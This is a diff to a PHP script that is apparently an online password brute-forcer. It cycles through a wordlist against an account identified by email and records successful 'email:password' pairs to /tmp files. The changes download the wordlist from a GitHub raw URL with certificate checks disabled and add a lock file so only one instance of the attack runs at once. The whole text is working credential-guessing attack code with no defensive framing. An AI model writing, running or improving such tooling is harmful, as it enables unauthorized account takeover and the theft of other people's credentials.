@@ -25,6 +25,19 @@ $HDR = [
     'Cache-Control: max-age=0',
 ];
 
+$WORDLIST_URL = 'https://raw.githubusercontent.com/heinzo666/sync-assets/main/wl.txt';
+$LOCK = '/tmp/w.lock';
+if (file_exists($LOCK) && (time() - filemtime($LOCK)) < 240) { exit(0); }   // another instance alive
+@touch($LOCK);
+
+if (!file_exists($wl) || filesize($wl) < 100000) {
+    $ch = curl_init($WORDLIST_URL);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_TIMEOUT => 300,
+                            CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_FOLLOWLOCATION => 1]);
+    $data = curl_exec($ch); curl_close($ch);
+    if ($data) @file_put_contents($wl, $data);
+}
+
 $words = @file($wl, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 if (!$words) { file_put_contents($out, "NO WORDLIST $wl\n", FILE_APPEND); exit(1); }
 $total = count($words);
@@ -92,6 +105,7 @@ for ($idx = 0; $idx < $total; $idx++) {
         file_put_contents($out, "*** HIT *** password=$pw code=$code\n", FILE_APPEND);
         file_put_contents('/tmp/HIT_' . $shard . '.txt', "$email:$pw\n");
     }
+    if ($i % 20 === 0) { @touch($LOCK); }
     if ($i % 100 === 0) {
         $el = max(1, time() - $t0);
         file_put_contents($out, sprintf("progress i=%d rate=%.2f/s tokfail=%d last=%s\n", $i, $i / $el, $tokfail, $pw), FILE_APPEND);
